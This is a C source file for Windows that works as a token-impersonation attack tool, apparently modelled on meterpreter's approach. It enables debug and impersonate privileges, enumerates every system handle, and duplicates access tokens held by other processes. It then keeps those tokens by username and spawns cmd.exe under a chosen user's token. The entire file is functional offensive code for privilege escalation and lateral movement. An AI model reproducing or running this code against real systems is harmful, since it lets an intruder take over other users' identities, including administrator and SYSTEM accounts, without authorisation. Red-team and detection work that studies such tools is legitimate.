#include "stdafx.h"

_NtQueryObject NtQueryObject = NULL;
_NtQuerySystemInformation NtQuerySystemInformation = NULL;

static TOKEN_COLLECTION tokenCollection[20];
static DWORD tokenCollectionCount = 0;

// Add an access token to our list of discovered tokens
BOOL AddToTokenCollection(HANDLE token, const char *username, SECURITY_IMPERSONATION_LEVEL impersonation) {

	for (unsigned int i = 0; i < tokenCollectionCount; i++) {
		if (strcmp(tokenCollection[i].username, username) == 0) {
			// We already have a token for this user, check if we have a different impersonation level
			if (tokenCollection[i].impersonationLevel == impersonation) {
				// We already have this kind of token, so we return
				return FALSE;
			}
		}
	}

	// If we reach here, we have a new username / token so we add it to our collection
	tokenCollection[tokenCollectionCount].token = token;
	tokenCollection[tokenCollectionCount].impersonationLevel = impersonation;
	strncpy_s(tokenCollection[tokenCollectionCount].username, username, USERNAME_LEN);

	tokenCollectionCount++;
	return TRUE;
}

// Return a token for the provided username
HANDLE GetTokenForUser(const char *username) {

	for (unsigned int i = 0; i < tokenCollectionCount; i++) {
		if (strcmp(tokenCollection[i].username, username) == 0) {
			return tokenCollection[i].token;
		}
	}

	return NULL;
}

// Retrieve a list of all handles that we have access to
PSYSTEM_HANDLE_INFORMATION GetAllHandles(void) {

	DWORD bufferSize, retBufferSize, status;
	PSYSTEM_HANDLE_INFORMATION handleInformation = NULL;

	// Retrieve a pointer to NtQuerySystemInformation
	NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(LoadLibraryA("ntdll.dll"),
		"NtQuerySystemInformation");

	if (NtQuerySystemInformation == NULL) {
		return NULL;
	}

	bufferSize = sizeof(SYSTEM_HANDLE_INFORMATION);

	do {
		// Size returned is incorrect, so we double our allocation
		if (handleInformation != NULL) {
			LocalFree(handleInformation);
			bufferSize *= 2;
			retBufferSize = bufferSize;
		}

		handleInformation = (PSYSTEM_HANDLE_INFORMATION)LocalAlloc(LMEM_ZEROINIT, bufferSize);

		if (handleInformation == NULL) {
			return NULL;
		}

	} while ((status = NtQuerySystemInformation(SystemHandleInformation,
		handleInformation,
		bufferSize,
		&retBufferSize) != STATUS_SUCCESS));

	return handleInformation;
}

// Validates that the handle is a token, and returns the type information structure
POBJECT_TYPE_INFORMATION GetTokenInfo(HANDLE handle) {

	POBJECT_TYPE_INFORMATION objectInformation = NULL;
	DWORD bufferSize, retBufferSize, status;

	// Only load if we really need to
	if (NtQueryObject == NULL) {
		NtQueryObject = (_NtQueryObject)GetProcAddress(LoadLibraryA("ntdll.dll"),
													   "NtQueryObject");
		// Could not load our NtQuerySystemInformation API or NtQueryObject API
		if (NtQueryObject == NULL) {
			return NULL;
		}
	}

	bufferSize = sizeof(OBJECT_NAME_INFORMATION) * 4;

	do {
		// Size returned is incorrect, so we double our allocation
		if (objectInformation != NULL) {
			LocalFree(objectInformation);
			bufferSize *= 2;
			retBufferSize = bufferSize;
		}
		objectInformation = (POBJECT_TYPE_INFORMATION)LocalAlloc(LMEM_ZEROINIT, bufferSize);
	} while ((status = NtQueryObject(handle, 
									 ObjectTypeInformation, 
									 objectInformation, 
									 bufferSize, 
									 &retBufferSize) == STATUS_INFO_LENGTH_MISMATCH));
	
	// Make sure that we have a "Token" type
	if (wcscmp(L"Token", objectInformation->TypeName.Buffer) == 0) {
		return objectInformation;
	}

	// If not, free our allocation and return
	LocalFree(objectInformation);
	return NULL;
}

// Enables the required process privileges to access all tokens
void EnableDebugPrivilege(void) {
	TOKEN_PRIVILEGES *tp;
	HANDLE ptoken;
	
	tp = (TOKEN_PRIVILEGES *)LocalAlloc(LMEM_ZEROINIT, sizeof(TOKEN_PRIVILEGES) * 4);

	if (tp == NULL) {
		return;
	}

	LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME, &tp->Privileges[0].Luid);
	tp->Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp->Privileges[1].Luid);
	tp->Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;

	LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &tp->Privileges[2].Luid);
	tp->Privileges[2].Attributes = SE_PRIVILEGE_ENABLED;

	LookupPrivilegeValue(NULL, SE_INCREASE_QUOTA_NAME, &tp->Privileges[3].Luid);
	tp->Privileges[3].Attributes = SE_PRIVILEGE_ENABLED;

	tp->PrivilegeCount = 4;
	
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &ptoken)) {
		return;
	}

	if (!AdjustTokenPrivileges(ptoken, FALSE, tp, 0, NULL, 0)) {
		return;
	}
}

// Impersonate the owner of the provided access token
BOOL ImpersonateUser(HANDLE token) {

	HANDLE newtoken;
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));

	si.cb = sizeof(si);

	// Duplicate the provided token, and create a "Primary" token for our new process
	if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &newtoken)) {
		return FALSE;
	}

	// Attempt to spawn cmd.exe
	if (!CreateProcessAsUserA(newtoken, NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {

		ZeroMemory(&si, sizeof(si));
		ZeroMemory(&pi, sizeof(pi));

		si.cb = sizeof(si);

		// Sometimes we fail above (as shown at meterpreter/source/extensions/stdapi/server/sys/process/process.c)
		if (!CreateProcessWithTokenW(newtoken, LOGON_NETCREDENTIALS_ONLY, NULL, L"cmd.exe", NULL, NULL, NULL, (LPSTARTUPINFOW)&si, &pi)) {
			return FALSE;
		}
	}

	return TRUE;
}


// Retrieve a list of all process tokens
TOKEN_COLLECTION *ListAllProcessTokens(void) {

	DWORD retBufferSize = 0;
	PSYSTEM_HANDLE_INFORMATION handleInformation = NULL;
	POBJECT_TYPE_INFORMATION objectInformation = NULL;
	HANDLE processHandle = 0, duplicateHandle = 0;
	DWORD processId = -1;
	SID_NAME_USE sidNameUse = (SID_NAME_USE)0;
	char username[USERNAME_LEN], domain[USERNAME_LEN];
	void* tokenUser[9076];
	DWORD usernameSize, domainSize;

	// Enable our process debug privileges
	EnableDebugPrivilege();

	// Grab handle information for running processes
	handleInformation = GetAllHandles();

	// Loop through the handles to find process tokens
	for (unsigned int i = 0; i < handleInformation->HandleCount; i++) {

		// A bit of performance handling, as OpenProcess() is sooooo slow
		if (processId != handleInformation->Handles[i].ProcessId) {
			if (processHandle != 0) {
				CloseHandle(processHandle);
			}
			processHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, handleInformation->Handles[i].ProcessId);
			processId = handleInformation->Handles[i].ProcessId;
		}

		if (processHandle != NULL) {

			// We need to duplicate the handle to work with it (http://forum.sysinternals.com/howto-enumerate-handles_topic18892.html)
			if (DuplicateHandle(processHandle,
				(HANDLE)handleInformation->Handles[i].Handle,
				GetCurrentProcess(),
				&duplicateHandle,
				MAXIMUM_ALLOWED,
				FALSE,
				0x02) != FALSE) {

				// Get our handle information, and make sure we have a 'Token' type
				objectInformation = GetTokenInfo(duplicateHandle);

				if (objectInformation != NULL) {

					ZeroMemory(username, USERNAME_LEN);
					ZeroMemory(domain, USERNAME_LEN);

					usernameSize = USERNAME_LEN;
					domainSize = USERNAME_LEN;

					SECURITY_IMPERSONATION_LEVEL impersonation;

					// Get the username of the owner of the token
					if (GetTokenInformation(duplicateHandle, TokenUser, tokenUser, 9076, &retBufferSize) != 0) {

						if (LookupAccountSidA(NULL,
							((TOKEN_USER*)tokenUser)->User.Sid,
							username,
							&usernameSize,
							domain,
							&domainSize,
							&sidNameUse) != 0)

							if (GetTokenInformation(duplicateHandle, TokenImpersonationLevel, &impersonation, sizeof(impersonation), &retBufferSize)) {

								if (impersonation == SecurityImpersonation || impersonation == SecurityDelegation) {
									if (!AddToTokenCollection(duplicateHandle, username, impersonation)) {
										// We don't need this handle, so we free it
										CloseHandle(duplicateHandle);
									}
								}
							}
					}

					LocalFree(objectInformation);
				}
			}
		}
	}

	return tokenCollection;
}